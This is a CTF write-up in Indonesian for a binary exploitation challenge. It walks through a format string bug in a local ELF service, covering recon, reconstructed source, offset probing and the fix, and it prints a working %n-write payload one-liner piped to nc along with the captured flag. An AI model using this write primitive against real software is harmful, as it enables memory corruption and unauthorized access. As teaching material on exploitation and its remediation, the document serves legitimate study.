# Write-up: pwn_ei

**Target:** `ei` (ELF 64-bit, x86-64, not stripped) — `nc localhost 40101`
**Kategori:** Binary Exploitation (Pwn)
**Flag:** `TecFest26{1f_L0v1N9_y0U_15_4_51n_1lL_9L4Dly_83C0m3_4_51Nn3r}`

> ⚠️ Binary & instance ini sempat di-update beberapa kali selama testing. Alamat
> di bawah (`access_granted = 0x4040c0`, offset argumen `%9$n`) adalah untuk
> versi **terbaru** (MD5 `ebeba80adbe51b46bc3b2c9374c022dc`, `main` di `0x4012e1`).
> Lihat bagian **"Kalau binary/instance diupdate lagi"** di akhir — alamat &
> offset bisa berubah tiap kali direkompilasi/direstart, meski bug & teknik
> exploitasinya tetap sama.

## 1. Recon

```bash
file ei
checksec --file=ei
```

```
ei: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
RELRO: Partial RELRO   Canary: found   NX: enabled   PIE: No PIE
```

Poin penting:
- **No PIE** → semua alamat fungsi/global di binary ini *fixed*, gampang dipakai tanpa perlu leak alamat base dulu.
- **Canary found** → overflow stack klasik bakal ketahuan, tapi di sini kita nggak akan overflow stack sama sekali.
- **Not stripped** → nama fungsi/simbol kelihatan semua, mempermudah triase awal sebelum buka disassembler.

```bash
nm -C ei | grep -v ' U '
```

Simbol-simbol yang langsung menarik perhatian:
- `give_flag` — fungsi custom (bukan libc).
- `access_granted` — global variable di `.bss` (0x4040c0 di versi ini) — namanya jelas banget nunjukin ini adalah "saklar" buat ngasih flag.
- `flag` — buffer global 256 byte di `.bss` (0x4040e0) — di versi terbaru, isi `flag.txt` sudah di-`fgets()` ke sini **di awal `main()`**, sebelum loop input dimulai. `give_flag()` sekarang cuma `fputs(flag, stdout)`.

Pola ini sering dipakai: ada *gate variable* di memori, dan tugas kita cuma bikin variabel itu jadi non-zero.

## 2. Reverse `main()` (objdump + Binary Ninja)

```
objdump -d -M intel ei --start-address=0x4012e1 --stop-address=0x401480
```

Alur logikanya:

```c
FILE *fp = fopen("flag.txt", "r");
if (!fp) { puts("flag.txt tidak ditemukan..."); return 1; }
fgets(flag, 0x100, fp);     // simpan isi flag ke global `flag`
fclose(fp);

puts("Laporan diagnostik:");
char buf[0x110];
while (1) {
    printf("> ");
    fgets(buf, 0x100, stdin);
    buf[strcspn(buf, "\n")] = 0;        // strip newline

    if (strcmp(buf, "exit") == 0)
        break;                          // keluar program

    printf(buf);                        // <-- BUG: format string langsung!
    putchar('\n');

    if (access_granted != 0) {
        give_flag();                    // fputs(flag, stdout);
        break;
    }
}
```

`fgets` dengan size yang pas (0x100 ke buffer 0x110) jadi **tidak ada buffer overflow klasik**. Canary aman, nggak kepake di jalur exploit ini.

Vuln sebenarnya di satu baris:

```asm
lea rax,[rbp-0x110]
mov rdi,rax
call printf@plt
```

Ini `printf(buf)`, bukan `printf("%s", buf)`. Input user langsung jadi **format string** → classic **Format String Vulnerability**.

Target kita jelas: bikin `access_granted` (alamat `0x4040c0` di versi ini, 4 byte, di `.bss`) jadi non-zero, supaya `give_flag()` ketrigger dan nge-print isi `flag` yang sudah di-load.

## 3. Rencana Eksploitasi — Format String `%n` Write

Karena `No PIE`, alamat `access_granted` itu **konstan** untuk binary tertentu — tapi **beda antar versi binary** kalau direkompilasi (lihat catatan di akhir). Nggak perlu leak apa pun, tinggal cari cara nulis angka non-zero ke sana lewat bug `printf(buf)`.

Teknik standar: **`%n` write**, dengan trik urutan supaya nggak kena masalah byte NUL di tengah alamat:

1. **Cari "offset" argumen** — di `printf(buf)`, argumen variadic `%N$...` yang dibaca itu sebenarnya overlap dengan stack, dan karena `buf` ada di stack yang sama, pada offset tertentu **argumen `%N$p` itu literally adalah isi `buf` sendiri**. Caranya cari offset ini dengan brute-probe:

   ```
   %1$p.%2$p.%3$p. ... %14$p
   ```

   diawali marker unik 8 byte (misal `MARKERMK`), lalu lihat `%N$p` mana yang hasilnya match persis sama marker tersebut. Begitu ketemu argumen `N` yang overlap `buf+0`, maka argumen `N+1` otomatis overlap `buf+8`, `N+2` overlap `buf+16`, dst.

   > ⚠️ Offset ini **bisa beda tiap kali instance di-restart** (kemungkinan karena perbedaan panjang `argv`/`envp` di container yang menggeser alignment stack), **walau binary-nya persis sama**. Di semua percobaan sejauh ini offset yang ketemu konsisten `%8$p` = `buf+0` (jadi `%9$n` = tulis ke `buf+8`), tapi **selalu re-probe di environment target** sebelum percaya ini, jangan asumsikan.

2. **Susun payload** supaya alamat target (yang isinya ada byte NUL, karena mis. `0x004040c0`) **ditaruh SETELAH** directive `%n`, bukan sebelum. Kalau alamat ditaruh duluan, `printf` bakal berhenti scan format string begitu nemu byte `\x00` sebelum sempat ketemu `%n`-nya.

   Layout payload:

   ```
   byte 0-3  : "AAAA"        -> literal, dicetak dulu (counter printf jadi 4, non-zero)
   byte 4-7  : "%9$n"        -> argumen #9 dibaca sebagai pointer, printf nulis "4" ke sana
   byte 8-15 : p64(0x4040c0) -> alamat access_granted, pas di slot argumen #9
   ```

Karena `"AAAA%9$n"` cuma 8 karakter ASCII bersih (nggak ada NUL), `printf` pasti berhasil scan sampai ke `%9$n` duluan sebelum nyentuh byte NUL yang ada di alamat target (yang ditaruh setelahnya). Begitu `%9$n` diproses, `access_granted` langsung ditulis nilai `4` — **non-zero**, cek `if (access_granted != 0)` lolos, `give_flag()` jalan.

## 4. Eksekusi

### Script (`solve.py`)

```bash
python3 solve.py
```

### One-liner (`solve_oneliner.sh`)

Versi paling simpel: python cuma nge-print payload mentah ke stdout, langsung di-pipe ke `nc`:

```bash
python3 -c "import sys,struct; sys.stdout.buffer.write(b'AAAA%9\$n' + struct.pack('<Q', 0x4040c0) + b'\n')" | nc -q2 localhost 40101
```

- `-q2` → `nc` tutup koneksi 2 detik setelah stdin-nya EOF (setelah python selesai nge-print), cukup buat nunggu balasan flag sebelum beneran disconnect.
- Pakai `sys.stdout.buffer.write()`, **bukan** `print()`. Sempat coba versi `print((b'...'+p64(addr)).decode('latin1'))` biar lebih singkat pakai pwntools, tapi itu **gagal** — `print()` di Python 3 nge-re-encode string ke UTF-8 pas nulis ke stdout, jadi byte alamat yang nilainya di atas `0x7F` malah ke-corrupt jadi multi-byte UTF-8 sebelum sempat dikirim. `sys.stdout.buffer.write()` nulis raw bytes langsung tanpa lewat text-encoding apa pun, jadi aman.

Output:

```
> AAAA\xac@@
TecFest26{1f_L0v1N9_y0U_15_4_51n_1lL_9L4Dly_83C0m3_4_51Nn3r}
```

Baris pertama itu cuma efek samping payload kita yang ke-echo balik lewat `printf(buf)` (literal "AAAA" + sisa byte alamat yang kebetulan masih printable). Baris kedua: **flag**.

## 5. Ringkasan Root Cause

- **Bug:** `printf(buf)` tanpa format specifier (`"%s"`) → format string vulnerability.
- **Dampak:** attacker bisa baca (`%p`/`%s`) maupun tulis sembarang alamat (`%n`) tanpa butuh overflow stack sama sekali — canary & NX jadi nggak relevan karena kita nggak nulis ke stack/return address, cuma ke `.bss`.
- **Fix yang benar:** ganti `printf(buf)` → `printf("%s", buf)`.

## 6. Kalau binary/instance diupdate lagi

Dari pengalaman testing ini (binary & instance sempat diganti 2x), berikut yang **berubah** vs yang **tetap**:

| | Tetap | Bisa berubah |
|---|---|---|
| Kelas bug | Format string via `printf(buf)` | — |
| Lokasi bug di source | Pola kode identik (`fgets` → `strcspn` → `strcmp("exit")` → `printf(buf)` → cek `access_granted`) | — |
| Alamat `access_granted`, `give_flag`, `main` | — | **Bisa geser** kalau binary direkompilasi (walau cuma ditambah dikit kode, misal logic load-flag-di-awal nambah ukuran `main`) |
| Offset argumen `%N$n` (mana argumen yang overlap `buf+N`) | — | **Bisa geser** tiap instance/container direstart, walau binary-nya sama persis (beda panjang `argv`/`envp`) |

**Checklist re-exploit kalau ada update lagi:**
1. `nm -C ei | grep -E 'access_granted|give_flag'` → ambil alamat baru.
2. Re-disasm `main()` sekitar bagian cek `access_granted` — pastikan logikanya masih sama (`test eax,eax; je ...; call give_flag`).
3. Re-probe offset argumen ke **instance yang sedang hidup** (bukan asumsi dari versi sebelumnya!) pakai marker 8-byte + `%1$p...%20$p`, cari yang match.
4. `solve.py` sudah punya mode `FIND_OFFSET=1` (`python3 solve.py FIND_OFFSET=1`) untuk re-probe otomatis — tinggal update `ACCESS_GRANTED` di bagian atas file manual kalau alamatnya berubah.
